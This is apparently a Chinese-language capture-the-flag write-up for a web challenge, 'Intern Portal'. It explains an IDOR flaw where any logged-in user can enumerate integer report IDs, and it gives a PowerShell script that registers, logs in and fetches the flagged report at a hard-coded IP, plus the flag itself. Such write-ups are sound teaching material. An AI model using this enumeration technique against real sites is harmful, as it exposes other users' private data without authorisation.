# Intern Portal

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://23.179.17.92:5001
- 核心漏洞：已登录用户可通过可预测的 `report?id=` 直接读取任意 report，存在典型 IDOR / Broken Access Control

## 入口与现象

首页会强制跳转到 `/login`，注册并登录后可以进入一个很简单的 Dashboard：

- 可以新建 report
- 可以点击自己的 report 进入 `/report?id=xxxx`
- report 的 URL 直接使用整数 ID

页面上虽然只展示“自己的 report 列表”，但真正取 report 详情时完全依赖查询参数里的 `id`，这类场景优先就该怀疑越权读取。

我先注册两个普通用户做验证：

1. 用户 A 创建一条 report。
2. 用户 B 在登录状态下，直接访问用户 A 的 `/report?id=...`。
3. 结果用户 B 仍然能成功看到用户 A 的内容。

这说明服务端虽然做了登录校验，但没有校验“当前 report 是否属于当前用户”，已经是标准的水平越权。

## 分析过程

创建 report 后，Dashboard 上会给出形如：

```text
/report?id=13839
```

这种设计有两个危险点：

1. ID 是纯整数，可预测、可枚举。
2. 服务端只判断“你有没有登录”，没有判断“这个 ID 对应的 report 是不是你的”。

继续测试后可以确认：

- 不登录访问 `/report?id=...` 会被重定向到 `/login`
- 但只要随便登录一个普通账号，就能读取别人的 report

因此利用方式非常直接：拿一个普通账号登录后，从低位或当前活跃区间开始枚举 `report?id=`。

枚举过程中能看到大量历史 report，其中很多是：

```text
Fake report #346
Fake report #348
```

而在 `347` 这个 ID 上，返回内容直接就是 flag：

```text
CIT{Acc355_C0ntr0l_M@tt3rs!}
```

这个位置夹在连续的 fake report 中间，非常明显就是题目作者故意埋进去的敏感 report。

## 利用过程

1. 访问 `/register` 注册任意普通用户。
2. 登录后进入 Dashboard，确认 report 详情使用 `/report?id=整数` 的形式访问。
3. 用第二个账号验证：不同用户之间可以互相读取 report，确定存在 IDOR。
4. 保持任意普通账号登录，直接枚举 `report?id=`。
5. 在 `id=347` 处读到真实 flag。

关键响应如下：

```text
346 => Fake report #346
347 => CIT{Acc355_C0ntr0l_M@tt3rs!}
348 => Fake report #348
```

## 关键 payload / 命令

下面这段 PowerShell 就足够复现：

```powershell
$base = 'http://23.179.17.92:5001'
$u = 'intern' + [guid]::NewGuid().ToString('N').Substring(0,8)
$p = 'Passw0rd!'
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession

Invoke-WebRequest -UseBasicParsing -Uri "$base/register" -Method POST -Body @{
  username = $u
  password = $p
} -WebSession $s

Invoke-WebRequest -UseBasicParsing -Uri "$base/login" -Method POST -Body @{
  username = $u
  password = $p
} -WebSession $s

Invoke-WebRequest -UseBasicParsing -Uri "$base/report?id=347" -WebSession $s
```

如果想验证越权，也可以先让账号 A 创建 report，再让账号 B 直接访问账号 A 的 report ID。

## Flag

```text
CIT{Acc355_C0ntr0l_M@tt3rs!}
```

## 总结

这题的核心不是复杂注入，而是非常基础的访问控制缺失。开发者把 report 详情直接暴露为可预测的整数 ID，同时只校验“是否登录”，却没有校验“资源归属”。结果就是任意普通用户都能枚举并读取其他用户的历史 report，最终在 `id=347` 直接拿到 flag。
